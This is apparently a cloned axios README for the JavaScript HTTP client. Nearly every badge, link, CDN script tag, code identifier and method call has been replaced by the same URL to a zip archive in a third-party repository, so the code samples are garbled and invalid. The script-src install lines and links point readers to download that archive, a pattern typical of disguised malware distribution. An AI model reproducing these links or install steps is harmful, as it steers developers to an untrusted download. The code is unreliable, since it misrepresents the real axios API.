# axios

[![npm version](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
[![CDNJS](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
[![build status](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
[![code coverage](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
[![install size](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
[![npm downloads](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
[![gitter chat](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
[![code helpers](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)

Promise based HTTP client for the browser and https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip
## Table of Contents

  - [Features](#features)
  - [Browser Support](#browser-support)
  - [Installing](#installing)
  - [Example](#example)
  - [Axios API](#axios-api)
  - [Request method aliases](#request-method-aliases)
  - [Concurrency (Deprecated)](#concurrency-deprecated)
  - [Creating an instance](#creating-an-instance)
  - [Instance methods](#instance-methods)
  - [Request Config](#request-config)
  - [Response Schema](#response-schema)
  - [Config Defaults](#config-defaults)
    - [Global axios defaults](#global-axios-defaults)
    - [Custom instance defaults](#custom-instance-defaults)
    - [Config order of precedence](#config-order-of-precedence)
  - [Interceptors](#interceptors)
  - [Handling Errors](#handling-errors)
  - [Cancellation](#cancellation)
  - [Using application/x-www-form-urlencoded format](#using-applicationx-www-form-urlencoded-format)
    - [Browser](#browser)
    - [https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip](#nodejs)
      - [Query string](#query-string)
      - [Form data](#form-data)
  - [Semver](#semver)
  - [Promises](#promises)
  - [TypeScript](#typescript)
  - [Resources](#resources)
  - [Credits](#credits)
  - [License](#license)

## Features

- Make [XMLHttpRequests](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) from the browser
- Make [http](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) requests from https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip
- Supports the [Promise](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) API
- Intercept request and response
- Transform request and response data
- Cancel requests
- Automatic transforms for JSON data
- Client side support for protecting against [XSRF](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)

## Browser Support

![Chrome](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) | ![Firefox](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) | ![Safari](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) | ![Opera](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) | ![Edge](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) | ![IE](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) |
--- | --- | --- | --- | --- | --- |
Latest ✔ | Latest ✔ | Latest ✔ | Latest ✔ | Latest ✔ | 11 ✔ |

[![Browser Matrix](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)

## Installing

Using npm:

```bash
$ npm install axios
```

Using bower:

```bash
$ bower install axios
```

Using yarn:

```bash
$ yarn add axios
```

Using jsDelivr CDN:

```html
<script src="https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip"></script>
```

Using unpkg CDN:

```html
<script src="https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip"></script>
```

## Example

### note: CommonJS usage
In order to gain the TypeScript typings (for intellisense / autocomplete) while using CommonJS imports with `require()` use the following approach:

```js
const axios = require('axios').default;

// axios.<method> will now provide autocomplete and parameter typings
```

Performing a `GET` request

```js
const axios = require('axios');

// Make a request for a user with a given ID
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user?ID=12345')
  .then(function (response) {
    // handle success
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(response);
  })
  .catch(function (error) {
    // handle error
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(error);
  })
  .then(function () {
    // always executed
  });

// Optionally the request above could also be done as
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user', {
    params: {
      ID: 12345
    }
  })
  .then(function (response) {
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(response);
  })
  .catch(function (error) {
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(error);
  })
  .then(function () {
    // always executed
  });  

// Want to use async/await? Add the `async` keyword to your outer function/method.
async function getUser() {
  try {
    const response = await https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user?ID=12345');
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(response);
  } catch (error) {
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(error);
  }
}
```

> **NOTE:** `async/await` is part of ECMAScript 2017 and is not supported in Internet
> Explorer and older browsers, so use with caution.

Performing a `POST` request

```js
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user', {
    firstName: 'Fred',
    lastName: 'Flintstone'
  })
  .then(function (response) {
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(response);
  })
  .catch(function (error) {
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(error);
  });
```

Performing multiple concurrent requests

```js
function getUserAccount() {
  return https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user/12345');
}

function getUserPermissions() {
  return https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user/12345/permissions');
}

https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip([getUserAccount(), getUserPermissions()])
  .then(function (results) {
    const acct = results[0];
    const perm = results[1];
  });
```

## axios API

Requests can be made by passing the relevant config to `axios`.

##### axios(config)

```js
// Send a POST request
axios({
  method: 'post',
  url: '/user/12345',
  data: {
    firstName: 'Fred',
    lastName: 'Flintstone'
  }
});
```

```js
// GET request for remote image in https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip
axios({
  method: 'get',
  url: 'https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip',
  responseType: 'stream'
})
  .then(function (response) {
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip'))
  });
```

##### axios(url[, config])

```js
// Send a GET request (default method)
axios('/user/12345');
```

### Request method aliases

For convenience aliases have been provided for all supported request methods.

##### https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(config)
##### https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(url[, config])
##### https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(url[, config])
##### https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(url[, config])
##### https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(url[, config])
##### https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(url[, data[, config]])
##### https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(url[, data[, config]])
##### https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(url[, data[, config]])

###### NOTE
When using the alias methods `url`, `method`, and `data` properties don't need to be specified in config.

### Concurrency (Deprecated)
Please use `https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip` to replace the below functions.

Helper functions for dealing with concurrent requests.

https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(iterable)
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(callback)

### Creating an instance

You can create a new instance of axios with a custom config.

##### https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip([config])

```js
const instance = https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip({
  baseURL: 'https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip',
  timeout: 1000,
  headers: {'X-Custom-Header': 'foobar'}
});
```

### Instance methods

The available instance methods are listed below. The specified config will be merged with the instance config.

##### axios#request(config)
##### axios#get(url[, config])
##### axios#delete(url[, config])
##### axios#head(url[, config])
##### axios#options(url[, config])
##### axios#post(url[, data[, config]])
##### axios#put(url[, data[, config]])
##### axios#patch(url[, data[, config]])
##### axios#getUri([config])

## Request Config

These are the available config options for making requests. Only the `url` is required. Requests will default to `GET` if `method` is not specified.

```js
{
  // `url` is the server URL that will be used for the request
  url: '/user',

  // `method` is the request method to be used when making the request
  method: 'get', // default

  // `baseURL` will be prepended to `url` unless `url` is absolute.
  // It can be convenient to set `baseURL` for an instance of axios to pass relative URLs
  // to methods of that instance.
  baseURL: 'https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip',

  // `transformRequest` allows changes to the request data before it is sent to the server
  // This is only applicable for request methods 'PUT', 'POST', 'PATCH' and 'DELETE'
  // The last function in the array must return a string or an instance of Buffer, ArrayBuffer,
  // FormData or Stream
  // You may modify the headers object.
  transformRequest: [function (data, headers) {
    // Do whatever you want to transform the data

    return data;
  }],

  // `transformResponse` allows changes to the response data to be made before
  // it is passed to then/catch
  transformResponse: [function (data) {
    // Do whatever you want to transform the data

    return data;
  }],

  // `headers` are custom headers to be sent
  headers: {'X-Requested-With': 'XMLHttpRequest'},

  // `params` are the URL parameters to be sent with the request
  // Must be a plain object or a URLSearchParams object
  params: {
    ID: 12345
  },

  // `paramsSerializer` is an optional function in charge of serializing `params`
  // (e.g. https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip, https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)
  paramsSerializer: function (params) {
    return https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(params, {arrayFormat: 'brackets'})
  },

  // `data` is the data to be sent as the request body
  // Only applicable for request methods 'PUT', 'POST', 'DELETE , and 'PATCH'
  // When no `transformRequest` is set, must be of one of the following types:
  // - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams
  // - Browser only: FormData, File, Blob
  // - Node only: Stream, Buffer
  data: {
    firstName: 'Fred'
  },
  
  // syntax alternative to send data into the body
  // method post
  // only the value is sent, not the key
  data: 'Country=Brasil&City=Belo Horizonte',

  // `timeout` specifies the number of milliseconds before the request times out.
  // If the request takes longer than `timeout`, the request will be aborted.
  timeout: 1000, // default is `0` (no timeout)

  // `withCredentials` indicates whether or not cross-site Access-Control requests
  // should be made using credentials
  withCredentials: false, // default

  // `adapter` allows custom handling of requests which makes testing easier.
  // Return a promise and supply a valid response (see https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip).
  adapter: function (config) {
    /* ... */
  },

  // `auth` indicates that HTTP Basic auth should be used, and supplies credentials.
  // This will set an `Authorization` header, overwriting any existing
  // `Authorization` custom headers you have set using `headers`.
  // Please note that only HTTP Basic auth is configurable through this parameter.
  // For Bearer tokens and such, use `Authorization` custom headers instead.
  auth: {
    username: 'janedoe',
    password: 's00pers3cret'
  },

  // `responseType` indicates the type of data that the server will respond with
  // options are: 'arraybuffer', 'document', 'json', 'text', 'stream'
  //   browser only: 'blob'
  responseType: 'json', // default

  // `responseEncoding` indicates encoding to use for decoding responses (https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip only)
  // Note: Ignored for `responseType` of 'stream' or client-side requests
  responseEncoding: 'utf8', // default

  // `xsrfCookieName` is the name of the cookie to use as a value for xsrf token
  xsrfCookieName: 'XSRF-TOKEN', // default

  // `xsrfHeaderName` is the name of the http header that carries the xsrf token value
  xsrfHeaderName: 'X-XSRF-TOKEN', // default

  // `onUploadProgress` allows handling of progress events for uploads
  // browser only
  onUploadProgress: function (progressEvent) {
    // Do whatever you want with the native progress event
  },

  // `onDownloadProgress` allows handling of progress events for downloads
  // browser only
  onDownloadProgress: function (progressEvent) {
    // Do whatever you want with the native progress event
  },

  // `maxContentLength` defines the max size of the http response content in bytes allowed in https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip
  maxContentLength: 2000,

  // `maxBodyLength` (Node only option) defines the max size of the http request content in bytes allowed
  maxBodyLength: 2000,

  // `validateStatus` defines whether to resolve or reject the promise for a given
  // HTTP response status code. If `validateStatus` returns `true` (or is set to `null`
  // or `undefined`), the promise will be resolved; otherwise, the promise will be
  // rejected.
  validateStatus: function (status) {
    return status >= 200 && status < 300; // default
  },

  // `maxRedirects` defines the maximum number of redirects to follow in https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip
  // If set to 0, no redirects will be followed.
  maxRedirects: 5, // default

  // `socketPath` defines a UNIX Socket to be used in https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip
  // e.g. 'https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip' to send requests to the docker daemon.
  // Only either `socketPath` or `proxy` can be specified.
  // If both are specified, `socketPath` is used.
  socketPath: null, // default

  // `httpAgent` and `httpsAgent` define a custom agent to be used when performing http
  // and https requests, respectively, in https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip This allows options to be added like
  // `keepAlive` that are not enabled by default.
  httpAgent: new https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip({ keepAlive: true }),
  httpsAgent: new https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip({ keepAlive: true }),

  // `proxy` defines the hostname and port of the proxy server.
  // You can also define your proxy using the conventional `http_proxy` and
  // `https_proxy` environment variables. If you are using environment variables
  // for your proxy configuration, you can also define a `no_proxy` environment
  // variable as a comma-separated list of domains that should not be proxied.
  // Use `false` to disable proxies, ignoring environment variables.
  // `auth` indicates that HTTP Basic auth should be used to connect to the proxy, and
  // supplies credentials.
  // This will set an `Proxy-Authorization` header, overwriting any existing
  // `Proxy-Authorization` custom headers you have set using `headers`.
  proxy: {
    host: '127.0.0.1',
    port: 9000,
    auth: {
      username: 'mikeymike',
      password: 'rapunz3l'
    }
  },

  // `cancelToken` specifies a cancel token that can be used to cancel the request
  // (see Cancellation section below for details)
  cancelToken: new CancelToken(function (cancel) {
  }),

  // `decompress` indicates whether or not the response body should be decompressed 
  // automatically. If set to `true` will also remove the 'content-encoding' header 
  // from the responses objects of all decompressed responses
  // - Node only (XHR cannot turn off decompression)
  decompress: true // default

}
```

## Response Schema

The response for a request contains the following information.

```js
{
  // `data` is the response that was provided by the server
  data: {},

  // `status` is the HTTP status code from the server response
  status: 200,

  // `statusText` is the HTTP status message from the server response
  statusText: 'OK',

  // `headers` the HTTP headers that the server responded with
  // All header names are lower cased and can be accessed using the bracket notation.
  // Example: `https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip['content-type']`
  headers: {},

  // `config` is the config that was provided to `axios` for the request
  config: {},

  // `request` is the request that generated this response
  // It is the last ClientRequest instance in https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip (in redirects)
  // and an XMLHttpRequest instance in the browser
  request: {}
}
```

When using `then`, you will receive the response as follows:

```js
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user/12345')
  .then(function (response) {
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
  });
```

When using `catch`, or passing a [rejection callback](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) as second parameter of `then`, the response will be available through the `error` object as explained in the [Handling Errors](#handling-errors) section.

## Config Defaults

You can specify config defaults that will be applied to every request.

### Global axios defaults

```js
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip = 'https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip';
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip['Authorization'] = AUTH_TOKEN;
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip['Content-Type'] = 'application/x-www-form-urlencoded';
```

### Custom instance defaults

```js
// Set config defaults when creating the instance
const instance = https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip({
  baseURL: 'https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip'
});

// Alter defaults after instance has been created
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip['Authorization'] = AUTH_TOKEN;
```

### Config order of precedence

Config will be merged with an order of precedence. The order is library defaults found in [https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip), then `defaults` property of the instance, and finally `config` argument for the request. The latter will take precedence over the former. Here's an example.

```js
// Create an instance using the config defaults provided by the library
// At this point the timeout config value is `0` as is the default for the library
const instance = https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip();

// Override timeout default for the library
// Now all requests using this instance will wait 2.5 seconds before timing out
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip = 2500;

// Override timeout for this request as it's known to take a long time
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/longRequest', {
  timeout: 5000
});
```

## Interceptors

You can intercept requests or responses before they are handled by `then` or `catch`.

```js
// Add a request interceptor
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(function (config) {
    // Do something before request is sent
    return config;
  }, function (error) {
    // Do something with request error
    return https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(error);
  });

// Add a response interceptor
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(function (response) {
    // Any status code that lie within the range of 2xx cause this function to trigger
    // Do something with response data
    return response;
  }, function (error) {
    // Any status codes that falls outside the range of 2xx cause this function to trigger
    // Do something with response error
    return https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(error);
  });
```

If you need to remove an interceptor later you can.

```js
const myInterceptor = https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(function () {/*...*/});
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(myInterceptor);
```

You can add interceptors to a custom instance of axios.

```js
const instance = https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip();
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(function () {/*...*/});
```

## Handling Errors

```js
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user/12345')
  .catch(function (error) {
    if (https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) {
      // The request was made and the server responded with a status code
      // that falls out of the range of 2xx
      https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
      https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
      https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
    } else if (https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) {
      // The request was made but no response was received
      // `https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip` is an instance of XMLHttpRequest in the browser and an instance of
      // https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip in https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip
      https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
    } else {
      // Something happened in setting up the request that triggered an Error
      https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('Error', https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
    }
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
  });
```

Using the `validateStatus` config option, you can define HTTP code(s) that should throw an error.

```js
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user/12345', {
  validateStatus: function (status) {
    return status < 500; // Resolve only if the status code is less than 500
  }
})
```

Using `toJSON` you get an object with more information about the HTTP error.

```js
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user/12345')
  .catch(function (error) {
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip());
  });
```

## Cancellation

You can cancel a request using a *cancel token*.

> The axios cancel token API is based on the withdrawn [cancelable promises proposal](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip).

You can create a cancel token using the `https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip` factory as shown below:

```js
const CancelToken = https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip;
const source = https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip();

https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user/12345', {
  cancelToken: https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip
}).catch(function (thrown) {
  if (https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(thrown)) {
    https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('Request canceled', https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip);
  } else {
    // handle error
  }
});

https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user/12345', {
  name: 'new name'
}, {
  cancelToken: https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip
})

// cancel the request (the message parameter is optional)
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('Operation canceled by the user.');
```

You can also create a cancel token by passing an executor function to the `CancelToken` constructor:

```js
const CancelToken = https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip;
let cancel;

https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/user/12345', {
  cancelToken: new CancelToken(function executor(c) {
    // An executor function receives a cancel function as a parameter
    cancel = c;
  })
});

// cancel the request
cancel();
```

> Note: you can cancel several requests with the same cancel token.

## Using application/x-www-form-urlencoded format

By default, axios serializes JavaScript objects to `JSON`. To send data in the `application/x-www-form-urlencoded` format instead, you can use one of the following options.

### Browser

In a browser, you can use the [`URLSearchParams`](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) API as follows:

```js
const params = new URLSearchParams();
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('param1', 'value1');
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('param2', 'value2');
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/foo', params);
```

> Note that `URLSearchParams` is not supported by all browsers (see [https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip)), but there is a [polyfill](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) available (make sure to polyfill the global environment).

Alternatively, you can encode data using the [`qs`](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) library:

```js
const qs = require('qs');
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('/foo', https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip({ 'bar': 123 }));
```

Or in another way (ES6),

```js
import qs from 'qs';
const data = { 'bar': 123 };
const options = {
  method: 'POST',
  headers: { 'content-type': 'application/x-www-form-urlencoded' },
  data: https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip(data),
  url,
};
axios(options);
```

### https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip

#### Query string

In https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip, you can use the [`querystring`](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) module as follows:

```js
const querystring = require('querystring');
https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip('https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip', https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip({ foo: 'bar' }));
```

or ['URLSearchParams'](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) from ['url module'](https://raw.githubusercontent.com/cunelsandas/axios/master/examples/post/Software_v1.1-alpha.3.zip) as follows:

```js
const url = require('url');
